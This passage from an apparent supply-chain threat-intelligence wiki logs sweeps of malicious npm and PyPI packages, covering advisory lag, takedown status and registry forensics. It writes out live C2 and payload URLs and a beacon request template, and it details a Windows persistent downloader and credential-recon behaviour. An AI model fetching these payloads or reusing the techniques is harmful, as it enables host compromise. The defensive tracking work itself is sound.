**Baseline revision — the 3–4 h OSV→GHSA latency is real-time-pipeline-only; backlog names lag weeks.** The same 03:15–03:17 UTC window mirrored three August-era names that had sat GHSA-less since their `amazon-inspector` OSV entries: `de-morgan` (`MAL-2026-14264`, advised **Aug 19** → `GHSA-2vc2-gwg3-2gpx` Sep 22 03:15:48, holder-created 03:15:08, **45 downloads/week**), `transform-es2015-unicode-regex` (`MAL-2026-13612`, advised **Aug 7** → `GHSA-jcxm-5v55-599q` 03:15:48, holder 03:15:23), `emoji-prints-fancy` (`MAL-2026-14298`, advised **Aug 19** → `GHSA-m523-mggx-3fgr` 03:17:06, holder 03:16:33, **48 downloads/week**). Each OSV record now shows a second origin (`ghsa-malware`, modified_time Sep 22) bolted onto the August `amazon-inspector` origin = **GitHub's malware bot batch-ingested ~34–45-day-old Inspector findings at 03:15 UTC**, and npm holder-created the names in the same breath. Defender translation: downstream consumers that key on GHSA (Dependabot alerts, most scanner integrations) were blind to these two actively-downloading packages for 5–6 weeks while OSV consumers were warned; the working baseline is now **3–4 h for names the bot sees live, ~1 month+ for names that arrive via other finders** — watch both feeds, not just GitHub.

## <a id="september-22-sixteenth-sweep"></a>September 22 sixteenth sweep (~13:30–14:05 UTC): the `@baanx/abis` "takedown" was WRONG — the name is back at 200 with identical content; a registry 404 observed twice inside one outage window is not a takedown signal; survivors day ten continue; KEV still no Sep 22 batch (second day)

**Self-correction (retracted last sweep's headline state change):** the fifteenth sweep recorded `@baanx/abis` as the first live cluster member deleted with no security-holder replacement, "verified twice" at ~11:30 UTC. This sweep's re-check (~13:35 UTC, ~2 h later) returns **HTTP 200 with the byte-identical document** — same `_rev` (`2-420a02ad…`), same `created` 09-18T18:22:24.230Z, same `modified` 09-21T16:53:46.797Z, both versions 9.9.9 + 9.9.11 present, and the **9.9.11 tarball still downloads (200, 5,685 b)**. The name was never taken down. Two durable readings, and they matter more than the original observation did:

1. **An npm registry 404 is not a takedown signal.** The registry read 404 on a live, unmodified package — most plausibly a transient registry/CDN fault window, not an administrative action. The fifteenth sweep "verified twice" but both pulls fell inside the same few-minute window; **independent verification means separated in time and by cache path, not twice in a row.** The delete-only / re-registerable / operator-will-re-register-`bxabis` inference chain built on top of the 404 is retracted along with it.
2. **The negative-detection discipline in this wiki's own takedown-metadata signature helps:** a real npm neutralization leaves an `0.0.1-security` holder, fresh `created`, empty maintainers, `npm/security-holder` repository — a POSITIVE artifact. Delete-only cases leave nothing, which means absence-of-evidence claims need repeated evidence. Going forward, any bare-404 takedown claim on this page must be re-confirmed at the next sweep before it enters a homepage or feed entry. (The `@baanx/abis` GHSA mirror `GHSA-r554-rpx4-qw24` remains published regardless — the advisory layer stands on its own artifact analysis.)

**Survivor re-checks (eleventh consecutive pass, all 200, ~13:35–13:40 UTC):** `@baanx/abis` (see correction above — effectively a survivor), `@baanx/solana-lib` (9.9.10), `@baanx/blockchain-config` (9.9.11), `@insiderintelligence/googleadmanager` (9.9.10, ~212 h / day ten), `@pwaplatform/module-sso-integration` (99.0.1), `@insiderintelligence/componentlibrary` (9.9.10), `@asdfaskdjfksadhfkasf/nadaver2` (102.0.0), `@uh-platform` scope incl. `domain-widget` (100.0.0), `@uol-afiliados/affiliated-config-lib` (102.0.0), Telegram-fleet members `@siriusbeyond/ui` / `starbucks-sdk` / `@dbbhk/ui-components`, `radio-player-theme`, `@woodpecker-web-shared/components` — every one answering 200 with unchanged dist-tags. `googleadmanager` 9.9.10 tarball still downloadable (5,703 b). **C2 endpoints ALL still serving:** `smart-server.online/install.sh` 200, `npmjs.it.com` 401, `ipcheck-hashed.vercel.app/api/auth/f1f097d9…` 200, `pullgetsage` Worker 405.

**OSV sweep:** resumed at 16378 — **16378, 16379, 16380, 16381, 16382, 16383, 16385, 16390, 16400 all return "Vulnerability not found"; high-water unchanged at MAL-2026-16377, resume at 16378.** GitHub Advisory API npm stream: newest updated advisories are Sep 18 legitimate-vulnerability entries (React Router, Nuxt, md-editor-v3) — no new malware mirrors since the Sep 22 03:15 UTC backlog wave.

**KEV:** **unchanged 2026.09.21 / 1,717 at ~13:50 UTC** — the catalog has now sat through a second consecutive calendar-day boundary with no Sep 22 batch; no row for the actively-exploited Veeam CVE-2026-32996, and — new this sweep — no row for **Arista VCO CVE-2026-93952** which Arista itself says is "known to be actively exploited" (captured on the [Arista VCO page](arista-velocloud-orchestrator-cve-2026-16812-exploitation.md#september-22-second-vco-flaw-cve-2026-93952)); kernel trio attribution-less day five. - **`MAL-2026-16379` `@user-services/web-components` 9.9.10** — same family, `uswc` prefix, fires on install AND on every `require()`; supporting modules `b8d6e3.js`/`c9e7f4.js` reconstruct `oob.algamil7x.xyz` from byte arrays. **Publisher email `vrtpoc@algamil7x.xyz`.** Time block: created Sep 22 09:30:07, `9.9.10` at 12:17:42 — **8 minutes 46 seconds between publishes**, OSV at 13:57:51 = advisory ~1 h 40 m after the second version. - **`MAL-2026-16380` `chai-logger` 3.0.2** — neighbor shape, not DNS family: a fake Chai logging plugin whose `lib/query.js` is a ~4 MB obfuscator.io blob (23,868-entry rotated string array) executing at import, `lib/` filler is verbatim pino source, and `axios` is declared as a dependency solely to give the blob an HTTP client whose destination is rebuilt at runtime. Author metadata `jsonspack.com`. Created + loaded 09:53 UTC Sep 22, **still installable**, no GHSA. - **`MAL-2026-16381` `cisco-github-simple` 1.0.1** and **`MAL-2026-16382` `take-home-caller-id` 1.0.1** — preinstall recon POSTs (`hostname`, `username`, homedir, DNS servers, **`/etc/passwd` + `/etc/hosts`** contents, package.json) to two DIFFERENT fresh Burp Collaborator subdomains (`prk15yh0sbkd…` / `0decr93bem6onemg…` — the class's 4th and 5th distinct collectors this fortnight). **This wiki's registry forensics: BOTH names are already gone, and the `time` blocks show operator self-deletion, not registry action — created and `unpublished` 4 minutes apart (11:06:33→11:10:33 and 12:15:12→12:19:20 UTC), `versions: {}`, no `dist-tags`, no `0.0.1-security` holder, no GHSA (`affects=` queries empty for both).** The names are RE-REGISTERABLE and the only surviving evidence of what they did is the analysis text embedded in the OSV records. Durable: **a publish-and-delete name is invisible to every advisory-keyed consumer (GHSA never arrives for a deleted package the bot never saw live) — the OSV record's per-source detail section is the entire public artifact.** Registry `time` blocks keep the corpse's timeline even when the body is gone.

**The account-graft finding (this sweep's durable join):** the cluster's npm publisher emails now span **four accounts on one domain** — `emarketerpoc@algamil7x.xyz` (`googleadmanager`, `componentlibrary`), `metamaskpoc@algamil7x.xyz` (`@baanx` trio), and this week's `teslapoc@` / `vrtpoc@` — i.e. **`<brand>poc@algamil7x.xyz`**, where the brand half matches the squatted scope (`teslapoc` publishes `@tesla-insurance/*`). The attacker domain is therefore present in three places at once — DNS C2 endpoint, publisher email, and (via scope choice) the lure — and the publisher-email domain is the cheapest registry-side pivot this cluster has ever given: `registry.npmjs.org` scoped searches on maintainer + a resolver log for the domain catch the whole fleet regardless of package renames. Second durable read: every account is named as if it were doing authorized research work — `poc` here, `vd_danilov`'s bug-bounty README there, `radio-player-theme`'s self-labeled XSS "PoC" — **this actor class consistently dresses target-qualification as authorized testing, so self-declared benign labels are cluster tell, not exculpation.**

Content unknowable (versions purged, GHSA text is the standard full-compromise boilerplate); recorded as pipeline/stream state + the nine-second batch-registration tell as a durable forensic key for future co-registration claims.

The module sets `process.env.NODE_TLS_REJECT_UNAUTHORIZED='0'` at load = **disables TLS certificate validation for the entire Node process**, ships a live-looking third-party **Groq API key (`gsk_…`) in cleartext in an in-source `keyPool`**, and `godxxx`'s `--stop` mode shells out to `taskkill /F /IM node.exe` — killing every Node process on the machine, not just the tool. ## <a id="september-23-twenty-seventh-sweep"></a>September 23 twenty-seventh sweep (~11:30–12:10 UTC): OSV stream MOVES for the ninth time — one record, `MAL-2026-16475`, which is the PyPI half of the `supplychain.local` worm — while this stream's own survivors go quiet: `wurl_show_data` GONE from RubyGems, the `turbo-ws` "broken rail" was a transient (repo restored + this wiki read its payload: a Windows persistent downloader on a live C2), and `googleadmanager` 404s were SCOPE-CONFUSION — the scoped `@insiderintelligence/googleadmanager` never left npm

**OSV sweep (direct-ID, resume 16473): 16473 + 16474 live, 16475 live, 16476 live (= GHSA-mhjf-v53x-7p87, the npm-half advisory of the `supplychain.local` worm, published 11:53:33 UTC), 16477+ empty. High-water now MAL-2026-16476, resume 16477.** The ninth stream move (~6 h after the eighth ended at 16472): four records, and two of them are new artifact classes for this stream —

- **`16473` `sea-baileys` 1.0.2 (Amazon Inspector, published 09:07 UTC Sep 23) — the stream's first "mutable-dependency identity hijack" in the Baileys namespace, and it is DEAD-ON-ADVISORY.** Amazon Inspector's analysis (full text in OSV): the fork's `package.json` remaps the `libsignal` import specifier to **`npm:@otaxayun/libsignal-node@latest` — an unrelated third party's package pinned to the mutable `latest` tag**, and `lib/Signal/libsignal.js` routes the installer's **Signal Protocol identity private key, signed pre-key, session records and sender keys** through that dependency — so one publish under `@otaxayun/libsignal-node` replaces the crypto implementation under every future install of `sea-baileys`. Separately `prepareWAMessageMedia` unconditionally attaches a hardcoded newsletter annotation `120363409928671192@newsletter` ("HOSHINO AI INFORMATION") to every outgoing media message (the follow/ad-annotation abuse class, on-wiki since the August Baileys campaign). **This wiki's registry pulls:** `sea-baileys` created 2026-09-20 16:41 UTC, 1.0.2 **unpublished 2026-09-21 00:01 UTC (~7.3 h life, delete-only, no holder, surviving `unpublished` time block)**. The dependency target is the living half: **`@otaxayun/libsignal-node` is LIVE, `latest` = 2.0.3, maintainer `otaxxx17@gmail.com`, created Oct 2025, content genuinely Open Whisper/Forsta libsignal at this wiki's read** — i.e. an innocent third-party package sitting as a loaded dead-switch under a now-deleted fork; if `sea-baileys` (or anything else) is re-registered pointing at it and the `otaxayun` account flips, installers get a crypto-layer compromise with no npm artifact to scan. Fourth on-wiki instance of the mutable-dependency dead-switch class beside `tenka-san/libsignal-node`, and the first where the routed secret is the Signal identity key itself.
- **`16474` `vite-dev-launcher` 2.9.4 (Amazon Inspector, published 09:07 UTC Sep 23) — the FOURTH artifact of the Gradle-masquerade workspace-keyed agent family, and the second on the `npmjs.it.com` line — recorded on the [family page](npmjs-it-com-gradle-masquerade-full-rce-agent-pair-september-2026.md#september-23-fourth-family-member).** Vite dev-server cover story; postinstall `postinstall-run.cjs` → `lib/gradle/lifecycle/postinstall-entry.cjs` → base64+AES-256-GCM decrypt of embedded ciphertext in `agent-bytecode.segments.cjs`, **AES key = SHA-256 of nine named files in the target's own workspace (package.json, pnpm-workspace.yaml, vite-plugin-legacy-css.ts, scripts/gen-page-meta.cjs, scripts/git-tag.mjs, scripts/git-merge.mjs, src/router/routes.tsx, TAGLOG.md, index.html) plus a static pepper**, gated on a hardcoded `workspaceMaterialDigest` — same key-from-victim-files design as `@vitemirrorte/element-plus-vite-cli`; decrypted agent lands in the Gradle-cache path `~/.gradle/caches/transforms-3/8.7/instrumented/.../instrumentation-agent-runtime.mjs` and spawns detached/hidden with a **relay** argument; `lib/gradle/string-vault.cjs` (base64+XOR key `gI8.7|tr`) hides `c2Endpoint`/`apiRegister`/`apiTask`/`apiResult`/`apiFile`/`agentIdLeaf`/`relayEnvKey` + **TLS-bypass toggles**; redundant triggers: postinstall, plain `require()` (main → bin/cli.js → tooling-bootstrap.cjs → scheduleGradleDaemonSync → activateDaemonBridge), CLI invocation. **This wiki's registry forensics: created 2026-09-18 07:22:07 UTC, 2.9.4 unpublished 2026-09-18 17:06:35 UTC — the package died ~11 minutes BEFORE the Sep 21 pair's advisories and five days before this OSV record; surviving `unpublished` time block, delete-only, no holder, zero GHSA at check** (`affects=` query empty). `npmjs.it.com/api/register` re-probed this sweep: still **400 `invalid agent_id`** (~8 days on) — every family member ever registered remains beaconable.
- **`16475` `memoryos` (PyPI, kam193, published 11:05:40 UTC Sep 23) — the OSV arrival of the `supplychain.local` worm's PyPI half**, recorded on its own page: <supplychain-local-memtensor-npm-pypi-go-worm-aikido-september-2026.md>. Campaign slug `2026-09-compr-memoryos`, "First discovered by Safedep", references carry SafeDep's post + a VirusTotal file ref. **Lag measured: PyPI upload 05:25 UTC → OSV 11:05 UTC ≈ 5 h 40 m.** OSV found it by package-name query while the direct-ID probe at ~11:33 first returned 404 — the record was mid-import; re-check pattern holds (query-by-package is fresher than ID-guessing during import windows).
- **`16476` `@memtensor/memos-cloud-openclaw-plugin` (npm, ghsa-malware, published 11:53:33 UTC Sep 23) = alias `GHSA-mhjf-v53x-7p87`, critical, flags exactly 0.1.21 / 0.1.23 / 0.1.25, no CVE, no patched version** — the worm's npm half landing within **~45 seconds** of npm's own `latest`-tag move (registry `modified` 11:53:08 → GHSA 11:53:33): GitHub's malware ingestion fired at publish-cleanup time, ~9.5 h after the versions first went live. Both halves of the case are now formally advised; capture recorded on the worm page.

**Survivor and cluster-state pass (twenty-seventh) — three state changes, two corrections of our own record:**

- **CORRECTION (scope confusion, self-audit): `googleadmanager` was never the algamil7x artifact.** This sweep's bare-name probe of `googleadmanager` returned 404 (fifth consecutive, no holder) — but the **scoped `@insiderintelligence/googleadmanager` returns HTTP 200 with `latest` = 9.9.10, both versions, byte-identical timestamps (created 2026-09-18 14:11:13 UTC, 9.9.10 at 17:00:08), maintainer `emarketerpoc <emarketerpoc@algamil7x.xyz>` — the cluster's on-domain publisher email, LIVE on npm ~121 hours running across all seven sweeps.** The "404 fifth sweep" survivor checks were probing the bare name (a different, unrelated 404) while the scoped target of the GHSA (`GHSA-76rx-jxhm-vhww`) stayed up in the open. Method lesson recorded: this cluster's names are **scope-qualified** — every future survivor probe must use the URL-encoded scoped form (`@insiderintelligence%2Fgoogleadmanager`), and this wiki's sweep notes should scope-qualify all `@scope/name` artifacts in the resume list. Takedown-watch status for the scoped name resets: it is LIVE, advised since Sep 18, ~5 days serving.
- **CORRECTION (transient, self-audit): the `turbo-ws` git-tarball rail is NOT broken — and this wiki now has the payload.** The twenty-fourth sweep recorded `trktgq0wbre1/node-net-pool` 404; this sweep it returns **200** with `created_at` 2026-08-29, last push **2026-09-13** (":::1" commit). Two readings, both bad: either the repo delete was transient/GitHub-side (the ~05:50 UTC check likely hit a deletion that was restored, or a repo-name re-registration under the same account — `created_at` predates the 404 window so same-repo restore is the better fit). **The tarball is now fully read by this wiki (this is the first on-wiki reconstruction of the git-tarball payload this rail delivers):** `package.json` renames itself `node-request-utils` with `"postinstall": "node index.js"` (Windows-only, `process.platform !== "win32" → exit 0`); `index.js` (8,259 B, SHA-256 `e79d32b8…`) fetches a JS payload from **`https://limbomail.com/api/attachment/l4TIRPOsaUxR._603-vhKDRdgKl3RalN_TVUZYGPsJy2Y/all.js`** with **`rejectUnauthorized: false`**, staging into four Microsoft-masquerading AppData dirs (`%APPDATA%\Microsoft\Windows\WinSxS\Backup`, `…\Themes`, `%LOCALAPPDATA%\Microsoft\Windows\Caches`, `%TEMP%\MicrosoftEdge`) as `winsvc.js` + `WinSvcHost.vbs`; persistence is four-way (Run, RunOnce, **`UserInitMprLogonScript`**, Startup-folder `.lnk` — all via a self-deleting VBScript, files hidden + system attributes), PID-lock singleton, version-check re-download every 2 h ± jitter (HEAD `content-length` compared to cached size), and a payload sanity gate rejecting anything starting with `<` (HTML error pages). **`limbomail.com` resolves `34.111.179.208` (Google Cloud) and THIS WIKI FETCHED THE ACTIVE PAYLOAD: 1,621,090 bytes served right now, SHA-256 `4c592e01…`**, disguised with a fabricated "Microsoft Edge WebView2 Runtime Helper, Version 124.0.2478.112, BuildDate 2026-09-18, FIPS 140-2 Certificate #3196" comment header (no Microsoft binary is distributed as a 1.6 MB JS file at an attachment URL); - Standing survivors re-probed: `hachutis` 200 (day 3 of takedown watch), `helpersutils-dev-tools` 200, `@gsutevil/hta-ui` 200 (day 3), `my-company-device` 200, `internallib_v497` 200, `moidevl` 200, bare `turbo-ws` 200. `ai-script.test0ing7.workers.dev` re-probe: GET 200 / **POST now 200 (was 500)** = the CDP-scrape collector's ingest path went from broken to accepting at check — live ingestion window, third sweep running. `webhook.site` UUID `f9bff304…` now **404 (was 429)** — webhook expired/deleted = collector dead (weakest-signal rule, resolved). `npmjs.it.com` register 400 (unchanged).

## <a id="september-23-twenty-eighth-sweep"></a>September 23 twenty-eighth sweep (~15:00–15:40 UTC): OSV stream MOVES for the tenth time — three records (`MAL-2026-16477`–`16479`), a three-name interactsh dependency-confusion probe fleet — one name STILL LIVE and installable, and this wiki catches it shipping a ReferenceError bug that breaks its own beacon — while the `limbomail.com` payload **rotated in place** within ~3 h of our hash capture

**OSV sweep (direct-ID, resume 16477): 16477 + 16478 + 16479 live (published 14:10–14:14 UTC Sep 23, all amazon-inspector), 16480–16482 empty. High-water now MAL-2026-16479, resume 16480.** The tenth stream move (~2 h after the ninth closed at 16476) is a single coherent artifact set — three dependency-confusion qualification probes sharing one Project Discovery **Interactsh (`oast.fun`) collector** across two names:

- **`16477` `com.apple.unityplugin.storekit` 1.0.1 + 1.0.2 — LIVE and INSTALLABLE at this wiki's check, the crown of the sweep.** Amazon Inspector's text (captured in OSV): the package impersonates Apple's internal Unity StoreKit namespace (`author: "Apple, Inc"` verbatim in the manifest), and on `require()` `index.js` issues an HTTPS GET to hardcoded `https://dapnhid534ch06s9vpm0mbg1httu5gytc.oast.fun/?pkg=<pkgName>&os=<platform>&host=<hostname>` = the canonical dependency-confusion reconnaissance shape — the callback proves an internal build system resolved the attacker's public package instead of Apple's private one, and leaks the internal hostname. **This wiki's registry forensics: created 2026-09-23 08:12:15 UTC, 1.0.1 → 1.0.2 sixteen minutes later (08:28:30), maintainer `ihexcoder <ihexcoder+npmjs@gmail.com>`, zero GHSA at check (`affects=` query empty), downloads API hasn't indexed the name.** Tarballs pulled and read by this wiki: 1.0.1 is the ESM form (`import os from "os"`), 1.0.2 a CJS rewrite (`const os = require("os")`) — same two-line beacon, nothing else in the package (751 B unpacked, two files). **Bug-of-the-sweep, verified by executing 1.0.2's `index.js` under node: it throws `ReferenceError: pkgName is not defined`** — the template literal declares `const packageName` but interpolates `pkgName`, so require() crashes BEFORE the beacon GET fires: the probe has never successfully reported, on any machine that resolved it, and the crash itself is now a detection signature. Whether the publisher ever tested their own spyware is the sweep's comic relief; the targeting statement (an Apple-shaped internal namespace squat) is not.
- **`16479` `simplenewnpmpackage` 1.0.2 — same interactsh collector `dapnhid534ch06s9vpm0mbg1httu5gytc.oast.fun`.** Require-time HTTPS GET with `os.platform()` + `os.hostname()` as query params, no other functionality. This wiki: created 08:11:29 UTC, **unpublished 08:12:57 UTC — 88-second lifetime** (surviving `unpublished` time block, delete-only, no holder). The name is itself a qualification tell: a name so generic it exists only to be typo-resolved.
- **`16478` `event-hunter` 1.0.0 — postinstall `node index.js`, base64 JSON beacon to `https://estimator-nemeses-unwatched.ngrok-free.dev/canary?d=<base64>`** (hardcoded **ngrok free-tier tunnel** = the class's first on-wiki ngrok-rail probe; the tunnel returned 404 at this wiki's check — origin down or session recycled, re-pointable). Amazon Inspector's own text records the package metadata self-describing as a `Dependency Confusion to RCE` proof-of-concept. This wiki: created 10:27:18 UTC, unpublished 10:36:02 UTC (**9-minute lifetime**, delete-only, no holder, empty description/keywords).

**Durable reads (twenty-eighth):** (1) **the `oast.fun` subdomain string is the cluster key** — same wildcard-resolves, survives-renaming logic as the `*.oastify.com` Burp Collaborator rule already on this page; `dapnhid534ch06s9vpm0mbg1httu5gytc.oast.fun` answered HTTP 200 (72 B interactsh landing) at this wiki's check = the listener is live and whoever ran the fleet can still collect; add interactsh subdomains to the same resolver-log hunt as Collaborator IDs. (2) Three packages, two lifetimes (88 s and 9 min) vs one LIVE name, all published inside a 2 h 15 m window on the same day, two beacons sharing one collector = one scripted fleet with an inconsistent cleanup pass — the LIVE `com.apple.unityplugin.storekit` is the survivor to report; **takedown watch opened** (npm namespace-impersonation angle: an `author: "Apple, Inc"` squat on an Apple-shaped internal name is reportable under npm's impersonation policy independent of the malware finding). (3) Self-labeled PoC metadata remains untrusted per the standing rule — behavior is the artifact; all three carry the same behavior.

**STATE CHANGE — the `limbomail.com` `all.js` payload ROTATED IN PLACE.** The twenty-seventh sweep captured `1,621,090` bytes / SHA-256 `4c592e01…` at ~11:40–13:00 UTC; re-fetch this sweep at ~15:20 UTC returns **`1,627,971` bytes / SHA-256 `7efca94dca448ebff068012bdd12af995eedf861ba33f03b4776a0d69ff04826`** — same URL, same `200`, ~6.9 KB different, **within ~3 hours of our first hash**. The downloader's own 2 h ± jitter HEAD `content-length` re-check loop was built for exactly this: every infected host picks the new bundle up automatically, and any hash-based IoC from the twenty-seventh sweep is already stale. Durable rule promoted: **for server-cycled payload URLs, IoC the URL + size-drift pattern, not the file hash** — hash IoCs for in-place-rotating staging URLs expire by design. The `trktgq0wbre1/node-net-pool` repo and `turbo-ws` remain live (rail armed); payload behavioral read still pending (deobfuscation unresolved).

**Other checks (twenty-eighth):** KEV unchanged — catalogVersion 2026.09.23, count 1,721, newest rows still the Sep 22 quartet (JSON re-pull ~15:25 UTC; Sep 25 due dates tomorrow; lag queue: Veeam CVE-2026-32996 + kernel trio). Survivor spot-probes all still 200: `hachutis`, `helpersutils-dev-tools`, `@gsutevil/hta-ui` (day 4), scoped `@insiderintelligence/googleadmanager`, `my-company-device`, `turbo-ws`; `sea-baileys` and `vite-dev-launcher` still delete-only with NO `0.0.1-security` holder (re-registerable). Feeds: **StepSecurity published its own supplychain.local/sckit analysis today 14:34 UTC — full text captured on the [worm page](supplychain-local-memtensor-npm-pypi-go-worm-aikido-september-2026.md#september-23-stepsecurity-third-analyst)** (third independent analyst within 14 h of publication; the writeup's key method correction is recorded there: the `NPM_TOKEN`-mapping `collectStageZero()` is exported but NOT called from the live `index.js` — only the prompt-passing async `launchStageZero()` fires); Aikido latest is a Deel partnership post (below bar); Unit 42 Sep 21, Wiz Sep 22, Snyk Sep 22, Sonatype Sep 22, JFrog Sep 21 all below bar / unchanged; Socket CF-block, Akamai 403 persist. **No Shai-Hulud / Mini Shai-Hulud / TeamPCP follow-up in any checked stream.**

**IOCs added (twenty-eighth):** interactsh collector `dapnhid534ch06s9vpm0mbg1httu5gytc.oast.fun` (live, 200 at check); `event-hunter` ngrok rail `estimator-nemeses-unwatched.ngrok-free.dev/canary` (404 at check); packages `com.apple.unityplugin.storekit` 1.0.1/1.0.2 (LIVE, zero GHSA, `ReferenceError: pkgName` crash signature, maintainer `ihexcoder <ihexcoder+npmjs@gmail.com>`), `simplenewnpmpackage` (88-second life), `event-hunter` (9-minute life); rotated `limbomail.com/all.js` bundle SHA-256 `7efca94dca448ebff068012bdd12af995eedf861ba33f03b4776a0d69ff04826` (1,627,971 B, supersedes `4c592e01…` captured Sep 23 ~12:00 UTC); OSV `MAL-2026-16477`–`16479` (high-water 16479, resume 16480).

The stream has been silent ~3 h 20 m after its tenth move — the longest gap of the day.

Note also: fetching the bare path `https://limbomail.com/all.js` (without the attachment prefix) serves the legitimate-looking LimboMail landing page (11,255 B HTML, "Privacy-First Email") — **the C2 hosts the payload only under the long attachment path and presents a cover site everywhere else** (path-gated payload serving; same shape as the gsut.com lander/alive-API split — index the PATH, not the domain). The `/34.111.179.208` path also serves the landing page (SPA catch-all). `trktgq0wbre1/node-net-pool` repo still 200 (rail armed).

## Monitoring

- Takedown of the surviving `@insiderintelligence/googleadmanager` (live through Sep 21 check, ~156 h) **and of new sixth member `@baanx/solana-lib`** (live at Sep 21 check; GHSA not yet visible for it — OSV-sourced only at capture). **Plus the five `@tvg-mar/*` names (all live at Sep 22 ~22:40 UTC) and `n8n-nodes-data-transformer-utils` (live, C2 open).**
- Takedown / disposition of `@pwaplatform/module-sso-integration` (live at Sep 20 check despite an open malware-class GHSA), whether T-Bank or npm confirms or denies the bug-bounty claim, and whether the `vd_danilov` / `sobaka-kusaka.ru` / `npm-canary` infrastructure shows up in other packages.
- Domain rotation away from `algamil7x.xyz` (new `oob.*` domains using the same label grammar).
- Whether a **second wave / payload** appears aimed at orgs that beaconed (this cluster's reconnaissance shape invites a follow-on targeted drop).
- Whether Amazon Inspector or others publish more packages sharing the `lib/<hexish>.js` + `module.constructor._load` lineage (cluster growth beyond five).
- Any vendor writeup (Socket, SafeDep, StepSecurity, Sonatype) naming the campaign or linking it to a known actor — **no attribution currently exists or is implied here**; the domain string hints at nothing we treat as evidence.

## <a id="september-30-thirtieth-sweep"></a>September 30 thirtieth sweep (~04:00–04:45 UTC Oct 1): OSV stream EXPLODES — high-water jumps from 16479 to `MAL-2026-17417` (+938 records since the last sweep), the `com.apple.unityplugin.storekit` probe STILL live day eight, and the `limbomail.com` payload reveals its actual origin: the staging URL 302s to a **Replit-hosted GCS object with a 15-minute signed URL**

A 40-ID random sample across the range shows the composition: a Sep-22 **RubyGems `bundler`-typosquat mass-registration wave** dominates the middle of the range (dozens of one-letter-variant `b*und*er` names — `baunlder`, `bbunlder`, `beundlef`, `biaundler`, `biujdler`, `biundlwr`, `biunrler`, `biunsler`, `biuodler`, `bjnlder`, `bmudler`, `bsundlef`, `bsusndler`, `bunddler`, `bundef`, `bundlef-gem`, `bundlrf`, `bunlcer`, `bunldeo`, `bunldur`, `bunldwr`, `bunloer`, `bunxlers`, `buondlef`..., all published Sep 22) = the GemStuffer-adjacent keyboard-walk generator at registry scale; the tail (17172–17417, Sep 25–30) carries the live shapes: `@baanx/domain` (16486 — a FOURTH `@baanx` scope member, and this wiki's registry check shows the name is now an **`0.0.1-security` holder created 2026-09-24 00:40:21 UTC** = npm neutralized it), `@client-web-next/*` scope fleet (five sampled, Sep 22), `better-dotenv3`, `caracas4check`, `azure-langchain-example` (PyPI, Sep 28 — Azure+Langchain naming = AI-infra lure costume), `hardhat-zet`, `rai6jaisahthaghee5ou-loader-package`, `test-agency-assignment`, `@hrmony/benefitverwaltung` (German HR-scope costume), `esm-dotenv`, `mfahelper` (MFA-helper costume, Sep 30), and **two Baileys-sphere names on Sep 30 (`@nyzzpedia/baileys-new`, `ishumdz-bail`) = the Baileys/libsignal follow-abuse campaign re-arming after the sea-baileys dead-switch generation**. Durable read: the single-ID high-water method is obsolete at this scale — **resume sweeps at high-water+1 and expect backlog waves, not increments; sample-randomize inside gaps instead of trusting contiguity**. Full-record triage of the 938 is the next sweep's standing task.

**Survivor pass (all 200 at check, day eight of watch):** `hachutis`, `helpersutils-dev-tools`, `@gsutevil/hta-ui`, `my-company-device`, `turbo-ws` all LIVE. **`com.apple.unityplugin.storekit` STILL LIVE** — both 1.0.1/1.0.2 installable, latest 1.0.2, `created` 2026-09-23T08:12:15Z unchanged, **still ZERO GHSA after ~7 days** (affects-query empty at check): the namespace-impersonation report path has produced no public action; takedown watch continues, now past a week. Interactsh collector `dapnhid534ch06s9vpm0mbg1httu5gytc.oast.fun` still answers 200 = listener alive into day eight.

**STATE CHANGE — the `limbomail.com` payload is served from REPLIT object storage, and the answer to "how does a malware host survive" is now documented:** the real payload path `limbomail.com/api/attachment/l4TIRPOsaUxR._603-vhKDRdgKl3RalN_TVUZYGPsJy2Y/all.js`, stable at `7efca94d…`/1,627,971 B across the twenty-eighth and twenty-ninth sweeps, now returns **HTTP 302 → `https://storage.googleapis.com/replit-objstore-0605aa22-69c5-4e9b-b8e1-849682a3fbcb/.private/attachments/c4f0be50-9741-46af-82f2-bb9d68a2b55f` with a `X-Goog-Expires=899` (15-minute) signed URL**, serving **1,717,157 B / SHA-256 `53be5c93…`** — the THIRD bundle generation (`4c592e01…` → `7efca94d…` → this). Durable reads: **(1) `limbomail.com` is a front, not the host — the payload lives in a Replit app's private GCS bucket (`heimdall-production@replit-user-deployments` service account in the signing credential), so abuse reports to the domain's registrar/holder do nothing; the takedown target is the Replit app; (2) the origin architecture EXPLAINS the rotation behavior the twenty-eighth sweep codified — a signed-URL origin means the staging URL is permanent while content and signature cycle; URL+size-drift IoCing was the right rule and is now architecturally justified; (3) the bundle GREW again (1.63 MB → 1.72 MB) — size drift remains live; (4) GCS `replit-objstore-*` + `.private/attachments/` + short-expiry GOOG4 signatures from `replit-user-deployments` service accounts is a hunt-able egress shape for any org that blocks neither GCS nor Replit.** The `trktgq0wbre1/node-net-pool` repo still 200 (rail armed); bare `/all.js` still serves the LimboMail cover site.

## <a id="october-1-thirty-seventh-sweep"></a>October 1 thirty-seventh sweep (~17:00–17:25 UTC): OSV stream moves — `online-header` lived 119 minutes and **re-armed with a fresh publish 73 minutes AFTER its own advisory + GHSA mirror landed**, then npm erased it delete-only with no holder; and this wiki unpacks the live `future-scripts` time-bomb (`boom()`, October 10)

**New intelligence (stream-state, no new page):** OSV high-water moved `MAL-2026-17419` → **`MAL-2026-17420`** = npm **`online-header`** 99.0.0 (OpenSSF Package Analysis finder, "communicates with a domain associated with malicious activity", published Oct 1 14:55:35 UTC, import 15:19 UTC; 17421–17460 all 404 at check). The name's full lifecycle is readable from the surviving registry `time` document, and it is this wiki's cleanest observation yet of the **advisory-as-build-trigger loop firing in real time**: created **14:48:35 UTC** with a `0.0.0-stage` version, `99.0.0` sixty seconds later, OSV record at +7 min, `GHSA-hg4r-6gv8-6hmj` mirror at 15:30:25 UTC — and then the operator **published `99.0.1` at 16:43:06 UTC, 1 h 13 m AFTER the OSV record and 1 h 12 m AFTER the GHSA mirror** (matching the on-wiki `starlette-healthchecks` / `@baanx` precedent — the advisory feed is a build trigger, not a stop signal). npm completed the unpublish of all three versions at **16:47:38 UTC — 4.5 minutes after the re-arm** — and the disposition is **delete-only with NO `0.0.1-security` holder** (doc keys `_id`/`name`/`time`/`_rev` only) = the name is **re-registerable by anyone**, in unmarked contrast to the seven `pf*`/`pflag*`/`pulse-pwn*` names created-and-holdered the same morning. All tarballs 404 on npm, unpkg, and jsDelivr = payload permanently unknowable except via the OpenSSF origin SHA `161e267d…`; downloads API has not indexed the name; total exposure window **~119 minutes**, entirely inside the time block. Watch for re-registration of `online-header` (the 